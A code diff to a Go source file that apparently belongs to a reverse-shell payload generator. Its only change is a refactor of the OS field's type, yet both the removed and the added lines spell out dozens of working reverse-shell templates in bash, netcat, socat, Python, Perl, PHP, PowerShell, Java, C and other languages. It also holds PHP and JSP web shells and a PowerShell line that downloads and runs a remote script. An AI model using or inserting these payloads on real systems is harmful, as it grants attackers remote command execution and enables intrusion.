@@ -5,20 +5,20 @@ import (
 )
 
 var RevShells = []types.RevShell{
-	{Name: "Bash -i", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "sh -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1"},
-	{Name: "Bash 196", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "0<&196;exec 196<>/dev/tcp/{{HOST}}/{{PORT}}; sh <&196 >&196 2>&196"},
-	{Name: "Bash read line", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "exec 5<>/dev/tcp/{{HOST}}/{{PORT}};cat <&5 | while read line; do $line 2>&5 >&5; done"},
-	{Name: "Bash 5", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "sh -i 5<> /dev/tcp/{{HOST}}/{{PORT}} 0<&5 1>&5 2>&5"},
-	{Name: "Bash UDP", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "sh -i >& /dev/udp/{{HOST}}/{{PORT}} 0>&1"},
-	{Name: "nc mkfifo", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{HOST}} {{PORT}} >/tmp/f"},
-	{Name: "nc -e", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "nc {{HOST}} {{PORT}} -e sh"},
-	{Name: "BusyBox nc -e", OS: []types.OperatingSystem{"Linux"}, ShellTpl: "busybox nc {{HOST}} {{PORT}} -e /bin/sh"},
-	{Name: "nc -c", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "nc -c /bin/sh {{HOST}} {{PORT}}"},
-	{Name: "ncat -e", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "ncat {{HOST}} {{PORT}} -e /bin/sh"},
-	{Name: "ncat udp", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u {{HOST}} {{PORT}} >/tmp/f"},
-	{Name: "curl", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "C='curl -Ns telnet://{{HOST}}:{{PORT}}'; $C </dev/null 2>&1 | /bin/sh 2>&1 | $C >/dev/null"},
-	{Name: "rustcat", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "rcat connect -s /bin/sh {{HOST}} {{PORT}}"},
-	{Name: "C", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: `
+	{Name: "Bash -i", OS: []string{"Linux", "Mac"}, ShellTpl: "sh -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1"},
+	{Name: "Bash 196", OS: []string{"Linux", "Mac"}, ShellTpl: "0<&196;exec 196<>/dev/tcp/{{HOST}}/{{PORT}}; sh <&196 >&196 2>&196"},
+	{Name: "Bash read line", OS: []string{"Linux", "Mac"}, ShellTpl: "exec 5<>/dev/tcp/{{HOST}}/{{PORT}};cat <&5 | while read line; do $line 2>&5 >&5; done"},
+	{Name: "Bash 5", OS: []string{"Linux", "Mac"}, ShellTpl: "sh -i 5<> /dev/tcp/{{HOST}}/{{PORT}} 0<&5 1>&5 2>&5"},
+	{Name: "Bash UDP", OS: []string{"Linux", "Mac"}, ShellTpl: "sh -i >& /dev/udp/{{HOST}}/{{PORT}} 0>&1"},
+	{Name: "nc mkfifo", OS: []string{"Linux", "Mac"}, ShellTpl: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{HOST}} {{PORT}} >/tmp/f"},
+	{Name: "nc -e", OS: []string{"Linux", "Mac"}, ShellTpl: "nc {{HOST}} {{PORT}} -e sh"},
+	{Name: "BusyBox nc -e", OS: []string{"Linux"}, ShellTpl: "busybox nc {{HOST}} {{PORT}} -e /bin/sh"},
+	{Name: "nc -c", OS: []string{"Linux", "Mac"}, ShellTpl: "nc -c /bin/sh {{HOST}} {{PORT}}"},
+	{Name: "ncat -e", OS: []string{"Linux", "Mac"}, ShellTpl: "ncat {{HOST}} {{PORT}} -e /bin/sh"},
+	{Name: "ncat udp", OS: []string{"Linux", "Mac"}, ShellTpl: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u {{HOST}} {{PORT}} >/tmp/f"},
+	{Name: "curl", OS: []string{"Linux", "Mac"}, ShellTpl: "C='curl -Ns telnet://{{HOST}}:{{PORT}}'; $C </dev/null 2>&1 | /bin/sh 2>&1 | $C >/dev/null"},
+	{Name: "rustcat", OS: []string{"Linux", "Mac"}, ShellTpl: "rcat connect -s /bin/sh {{HOST}} {{PORT}}"},
+	{Name: "C", OS: []string{"Linux", "Mac"}, ShellTpl: `
 		#include <stdio.h>
 		#include <sys/socket.h>
 		#include <sys/types.h>
@@ -48,7 +48,7 @@ var RevShells = []types.RevShell{
 				return 0;       
 		}
 	`},
-	{Name: "C# TCP Client", OS: []types.OperatingSystem{"Linux"}, ShellTpl: `
+	{Name: "C# TCP Client", OS: []string{"Linux"}, ShellTpl: `
 	using System;
 	using System.Text;
 	using System.IO;
@@ -119,7 +119,7 @@ var RevShells = []types.RevShell{
 		}
 	}
 	`},
-	{Name: "C# Bash -i", OS: []types.OperatingSystem{"Linux"}, ShellTpl: `
+	{Name: "C# Bash -i", OS: []string{"Linux"}, ShellTpl: `
 		using System;
 		using System.Diagnostics;
 
@@ -140,14 +140,14 @@ var RevShells = []types.RevShell{
 			}
 		}
 	`},
-	{Name: "Haskell #1", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: `
+	{Name: "Haskell #1", OS: []string{"Linux", "Mac"}, ShellTpl: `
 	module Main where
 	import System.Process
 	main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {{HOST}} {{PORT}} >/tmp/f"
 	`},
-	{Name: "Perl", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "perl -e 'use Socket;$i=\"{{HOST}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"},
-	{Name: "Perl no sh", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{{HOST}}:{{PORT}}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},
-	{Name: "Perl PentestMonkey", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: `
+	{Name: "Perl", OS: []string{"Linux", "Mac"}, ShellTpl: "perl -e 'use Socket;$i=\"{{HOST}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"},
+	{Name: "Perl no sh", OS: []string{"Linux", "Mac"}, ShellTpl: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{{HOST}}:{{PORT}}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},
+	{Name: "Perl PentestMonkey", OS: []string{"Linux", "Mac"}, ShellTpl: `
 	#!/usr/bin/perl -w
 	# perl-reverse-shell - A Reverse Shell implementation in PERL
 	# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
@@ -273,7 +273,7 @@ var RevShells = []types.RevShell{
 	Content-Type: text\/html\r\n\r\n" . $global_page;
 	}
 	`},
-	{Name: "PHP PentestMonkey", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: `
+	{Name: "PHP PentestMonkey", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
 	<?php
 	// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 	// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -391,7 +391,7 @@ var RevShells = []types.RevShell{
 
 	?>
 	`},
-	{Name: "PHP cmd", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: `
+	{Name: "PHP cmd", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
 	<html>
 	<body>
 	<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
@@ -410,27 +410,27 @@ var RevShells = []types.RevShell{
 	<script>document.getElementById("cmd").focus();</script>
 	</html>
 	`},
-	{Name: "PHP cmd 2", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>"},
-	{Name: "PHP cmd small", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: "<?=`$_GET[0]`?>"},
-	{Name: "PHP exec", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});exec(\"/bin/sh <&3 >&3 2>&3\");'"},
-	{Name: "PHP shell_exec", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});shell_exec(\"/bin/sh <&3 >&3 2>&3\");'"},
-	{Name: "PHP system", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});system(\"/bin/sh <&3 >&3 2>&3\");'"},
-	{Name: "PHP passtru", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});passthru(\"/bin/sh <&3 >&3 2>&3\");'"},
-	{Name: "PHP`", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});`/bin/sh <&3 >&3 2>&3`;'"},
-	{Name: "PHP popen", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});popen(\"/bin/sh <&3 >&3 2>&3\", \"r\");'"},
-	{Name: "PHP proc_open", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"},
-	{Name: "Python #1", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "export RHOST=\"{{HOST}}\";export RPORT={{PORT}};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"},
-	{Name: "Python #2", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{HOST}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"},
-	{Name: "Python3 #1", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "export RHOST=\"{{HOST}}\";export RPORT={{PORT}};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"},
-	{Name: "Python3 #2", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{HOST}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"},
-	{Name: "Python3 shortest", OS: []types.OperatingSystem{"Linux"}, ShellTpl: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{{HOST}}\",{{PORT}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"},
-	{Name: "Ruby #1", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{{HOST}}\",{{PORT}}))'"},
-	{Name: "Ruby no sh", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{{HOST}}\",\"{{PORT}}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"},
-	{Name: "socat #1", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "socat TCP:{{HOST}}:{{PORT}} EXEC:/bin/sh"},
-	{Name: "socat #2 (TTY)", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "socat TCP:{{HOST}}:{{PORT}} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"},
-	{Name: "sqlite3 nc mkfifo", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{HOST}} {{PORT}} >/tmp/f'"},
-	{Name: "node.js", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "require('child_process').exec('nc -e /bin/sh {{HOST}} {{PORT}}')"},
-	{Name: "node.js #2", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: `
+	{Name: "PHP cmd 2", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>"},
+	{Name: "PHP cmd small", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "<?=`$_GET[0]`?>"},
+	{Name: "PHP exec", OS: []string{"Linux", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});exec(\"/bin/sh <&3 >&3 2>&3\");'"},
+	{Name: "PHP shell_exec", OS: []string{"Linux", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});shell_exec(\"/bin/sh <&3 >&3 2>&3\");'"},
+	{Name: "PHP system", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});system(\"/bin/sh <&3 >&3 2>&3\");'"},
+	{Name: "PHP passtru", OS: []string{"Linux", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});passthru(\"/bin/sh <&3 >&3 2>&3\");'"},
+	{Name: "PHP`", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});`/bin/sh <&3 >&3 2>&3`;'"},
+	{Name: "PHP popen", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});popen(\"/bin/sh <&3 >&3 2>&3\", \"r\");'"},
+	{Name: "PHP proc_open", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "php -r '$sock=fsockopen(\"{{HOST}}\",{{PORT}});$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"},
+	{Name: "Python #1", OS: []string{"Linux", "Mac"}, ShellTpl: "export RHOST=\"{{HOST}}\";export RPORT={{PORT}};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"},
+	{Name: "Python #2", OS: []string{"Linux", "Mac"}, ShellTpl: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{HOST}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"},
+	{Name: "Python3 #1", OS: []string{"Linux", "Mac"}, ShellTpl: "export RHOST=\"{{HOST}}\";export RPORT={{PORT}};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"},
+	{Name: "Python3 #2", OS: []string{"Linux", "Mac"}, ShellTpl: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{HOST}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"},
+	{Name: "Python3 shortest", OS: []string{"Linux"}, ShellTpl: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{{HOST}}\",{{PORT}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"},
+	{Name: "Ruby #1", OS: []string{"Linux", "Mac"}, ShellTpl: "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{{HOST}}\",{{PORT}}))'"},
+	{Name: "Ruby no sh", OS: []string{"Linux", "Mac"}, ShellTpl: "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{{HOST}}\",\"{{PORT}}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"},
+	{Name: "socat #1", OS: []string{"Linux", "Mac"}, ShellTpl: "socat TCP:{{HOST}}:{{PORT}} EXEC:/bin/sh"},
+	{Name: "socat #2 (TTY)", OS: []string{"Linux", "Mac"}, ShellTpl: "socat TCP:{{HOST}}:{{PORT}} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"},
+	{Name: "sqlite3 nc mkfifo", OS: []string{"Linux", "Mac"}, ShellTpl: "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{HOST}} {{PORT}} >/tmp/f'"},
+	{Name: "node.js", OS: []string{"Linux", "Mac"}, ShellTpl: "require('child_process').exec('nc -e /bin/sh {{HOST}} {{PORT}}')"},
+	{Name: "node.js #2", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
 	(function(){
 			var net = require("net"),
 					cp = require("child_process"),
@@ -444,7 +444,7 @@ var RevShells = []types.RevShell{
 			return /a/; // Prevents the Node.js application from crashing
 	})();
 	`},
-	{Name: "Java #1", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: `
+	{Name: "Java #1", OS: []string{"Linux", "Mac"}, ShellTpl: `
 	public class shell {
     public static void main(String[] args) {
         Process p;
@@ -456,7 +456,7 @@ var RevShells = []types.RevShell{
     }
 	}
 	`},
-	{Name: "Java #2", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: `
+	{Name: "Java #2", OS: []string{"Linux", "Mac"}, ShellTpl: `
 	public class shell {
     public static void main(String[] args) {
         ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1")
@@ -469,7 +469,7 @@ var RevShells = []types.RevShell{
     }
 	}
 	`},
-	{Name: "Java #3", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: `
+	{Name: "Java #3", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
 	import java.io.InputStream;
 	import java.io.OutputStream;
 	import java.net.Socket;
@@ -505,7 +505,7 @@ var RevShells = []types.RevShell{
     }
 	}
 	`},
-	{Name: "Java Web", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: `
+	{Name: "Java Web", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
 	<%@
 	page import="java.lang.*, java.util.*, java.io.*, java.net.*"
 	% >
@@ -582,7 +582,7 @@ var RevShells = []types.RevShell{
 	}
 	%>
 	`},
-	{Name: "Java Two Way", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: `
+	{Name: "Java Two Way", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
 	<%
     /*
      * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
@@ -682,7 +682,7 @@ var RevShells = []types.RevShell{
 	</body>
 	</html>
 	`},
-	{Name: "Javascript", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: `
+	{Name: "Javascript", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
 	String command = "var host = '{{HOST}}';" +
 		"var port = {{PORT}};" +
 		"var cmd = '/bin/sh';"+
@@ -713,14 +713,14 @@ var RevShells = []types.RevShell{
 	String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
 	ref.add(new StringRefAddr("x", x);
 	`},
-	{Name: "telnet", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "TF=$(mktemp -u);mkfifo $TF && telnet {{HOST}} {{PORT}} 0<$TF | /bin/sh 1>$TF"},
-	{Name: "zsh", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "zsh -c 'zmodload zsh/net/tcp && ztcp {{HOST}} {{PORT}} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"},
-	{Name: "Lua #1", OS: []types.OperatingSystem{"Linux"}, ShellTpl: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{{HOST}}','{{PORT}}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""},
-	{Name: "Lua #2", OS: []types.OperatingSystem{"Linux", "Windows"}, ShellTpl: "lua5.1 -e 'local host, port = \"{{HOST}}\", {{PORT}} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"},
-	{Name: "Golang", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{{HOST}}:{{PORT}}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"},
-	{Name: "Vlang", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e /bin/sh {{HOST}} {{PORT}} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"},
-	{Name: "Awk", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: "awk 'BEGIN {s = \"/inet/tcp/0/{{HOST}}/{{PORT}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"},
-	{Name: "Dart", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: `
+	{Name: "telnet", OS: []string{"Linux", "Mac"}, ShellTpl: "TF=$(mktemp -u);mkfifo $TF && telnet {{HOST}} {{PORT}} 0<$TF | /bin/sh 1>$TF"},
+	{Name: "zsh", OS: []string{"Linux", "Mac"}, ShellTpl: "zsh -c 'zmodload zsh/net/tcp && ztcp {{HOST}} {{PORT}} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"},
+	{Name: "Lua #1", OS: []string{"Linux"}, ShellTpl: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{{HOST}}','{{PORT}}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""},
+	{Name: "Lua #2", OS: []string{"Linux", "Windows"}, ShellTpl: "lua5.1 -e 'local host, port = \"{{HOST}}\", {{PORT}} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"},
+	{Name: "Golang", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{{HOST}}:{{PORT}}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"},
+	{Name: "Vlang", OS: []string{"Linux", "Mac"}, ShellTpl: "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e /bin/sh {{HOST}} {{PORT}} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"},
+	{Name: "Awk", OS: []string{"Linux", "Mac"}, ShellTpl: "awk 'BEGIN {s = \"/inet/tcp/0/{{HOST}}/{{PORT}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"},
+	{Name: "Dart", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: `
 	import 'dart:io';
 	import 'dart:convert';
 	
@@ -740,8 +740,8 @@ var RevShells = []types.RevShell{
 		});
 	}
 	`},
-	{Name: "Crystal (system)", OS: []types.OperatingSystem{"Linux", "Windows", "Mac"}, ShellTpl: "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{{HOST}}\",{{PORT}});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'"},
-	{Name: "Crystal (code)", OS: []types.OperatingSystem{"Linux", "Mac"}, ShellTpl: `
+	{Name: "Crystal (system)", OS: []string{"Linux", "Windows", "Mac"}, ShellTpl: "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{{HOST}}\",{{PORT}});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'"},
+	{Name: "Crystal (code)", OS: []string{"Linux", "Mac"}, ShellTpl: `
 	require "process"
 	require "socket"
 
@@ -753,9 +753,9 @@ var RevShells = []types.RevShell{
 		c << p.output.gets_to_end
 	end
 	`},
-	{Name: "nc.exe", OS: []types.OperatingSystem{"Windows"}, ShellTpl: "nc.exe {{HOST}} {{PORT}} -e /bin/sh"},
-	{Name: "ncat.exe", OS: []types.OperatingSystem{"Windows"}, ShellTpl: "ncat.exe {{HOST}} {{PORT}} -e /bin/sh"},
-	{Name: "C Windows", OS: []types.OperatingSystem{"Windows"}, ShellTpl: `
+	{Name: "nc.exe", OS: []string{"Windows"}, ShellTpl: "nc.exe {{HOST}} {{PORT}} -e /bin/sh"},
+	{Name: "ncat.exe", OS: []string{"Windows"}, ShellTpl: "ncat.exe {{HOST}} {{PORT}} -e /bin/sh"},
+	{Name: "C Windows", OS: []string{"Windows"}, ShellTpl: `
 	#include <winsock2.h>
 	#include <stdio.h>
 	#pragma comment(lib,"ws2_32")
@@ -798,7 +798,7 @@ var RevShells = []types.RevShell{
     return 0;
 	}
 	`},
-	{Name: "C# TCP Client", OS: []types.OperatingSystem{"Windows"}, ShellTpl: `
+	{Name: "C# TCP Client", OS: []string{"Windows"}, ShellTpl: `
 	using System;
 	using System.Text;
 	using System.IO;
@@ -869,7 +869,7 @@ var RevShells = []types.RevShell{
 		}
 	}
 	`},
-	{Name: "C# Bash -i", OS: []types.OperatingSystem{"Windows"}, ShellTpl: `
+	{Name: "C# Bash -i", OS: []string{"Windows"}, ShellTpl: `
 	using System;
 	using System.Diagnostics;
 
@@ -889,13 +889,13 @@ var RevShells = []types.RevShell{
 		}
 	}
 	`},
-	{Name: "Windows ConPty", OS: []types.OperatingSystem{"Windows"}, ShellTpl: "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{HOST}} {{PORT}}"},
-	{Name: "PowerShell #1", OS: []types.OperatingSystem{"Windows"}, ShellTpl: "$LHOST = \"{{HOST}}\"; $LPORT = {{PORT}}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; 